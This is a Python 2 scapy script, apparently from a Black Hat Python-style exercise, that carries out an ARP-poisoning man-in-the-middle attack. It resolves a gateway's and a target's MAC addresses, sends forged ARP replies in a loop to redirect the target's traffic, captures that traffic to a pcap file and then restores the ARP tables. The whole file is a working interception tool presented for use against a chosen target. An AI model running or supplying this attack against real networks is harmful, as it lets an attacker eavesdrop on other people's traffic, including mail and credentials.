#!/usr/bin/env python
'''mail sniffer'''

from scapy.all import *
import os
import threading
import signal

import sys
import argparse

poisoning = False

def getargs():
    '''parse the command line arguments'''
    # process the command line
    parser = argparse.ArgumentParser(description='BHP ARPer')
    parser.add_argument('gateway', help='The gateway to spoof')
    parser.add_argument('target', help='The target of the attack')
    parser.add_argument('-c', '--count', default=1000, help='number of packets to observe')
    parser.add_argument('-i', '--interface', default='eth0', help='interface to use')

    result = parser.parse_args()
    #print result
    return result
def get_mac(ip_addr, dest='ff:ff:ff:ff:ff:ff', timeout=2, retry=10):
    '''get the mac address'''
    response, unanswered = srp(Ether(dst=dest)/ARP(pdst=ip_addr), timeout=timeout, retry=retry)
    for s, r in response:
        return r[Ether].src
    return None

def getmac(name, ip_addr, confirm=True):
    '''Get mac address with optional confirmation'''
    result = get_mac(ip_addr)
    if result is None:
        print '[!!!] Failed to get %s MAC for IP "%s". Exiting.' % (name, ip_addr)
        sys.exit(1)
    elif confirm:
        print '%s %s is at %s' % (name, ip_addr, result)
    return result

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    '''poison'''
    global poisoning
    poison_t = ARP()
    poison_t.op = 2
    poison_t.psrc = gateway_ip
    poison_t.pdst = target_ip
    poison_t.hwdst = target_mac

    poison_g = ARP()
    poison_g.op = 2
    poison_g.psrc = target_ip
    poison_g.pdst = gateway_ip
    poison_g.hwdst = gateway_mac
    print '[*] Begining the ARP poison. [CTRL-C to stop]'
    while poisoning:
        send(poison_t)
        send(poison_g)
        time.sleep(2)
    print '[*] ARP poison attack finished.'
    return

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    '''restore the arp setup'''
    # slightly different method using send
    print '[*] Restoring target...'
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip,
                hwdst='ff:ff:ff:ff:ff:ff', hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip,
                hwdst='ff:ff:ff:ff:ff:ff', hwsrc=target_mac), count=5)
    print '[*] Target restored.'
    

def main():
    '''main'''
    global poisoning
    ns = getargs()
    gateway_ip = ns.gateway
    target_ip = ns.target
    count = ns.count
    interface = ns.interface
    print (gateway_ip, target_ip, count, interface)

    # set our interface
    conf.iface = interface

    # turn off output
    conf.verb = 0

    print '[*] Setting up %s' % interface
    gateway_mac = getmac('Gateway', gateway_ip, True)
    target_mac = getmac('Target', target_ip, True)


    poison_thread = threading.Thread(target=poison_target,
                                     args=(gateway_ip,
                                           gateway_mac,
                                           target_ip,
                                           target_mac))
    poisoning = True
    poison_thread.start()

    try:
        print '[*] Starting sniffer for %d packets' % count
        bpf_filter = 'ip host %s' % target_ip
        packets = sniff(count=count, filter=bpf_filter, iface=interface)
    except KeyboardInterrupt:
        pass
    finally:
        print'[*] Writing the packets...'
        wrpcap('arper.pcap', packets)
        print'[*] Packets written.'

        poisoning = False

        time.sleep(2)

        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

main()
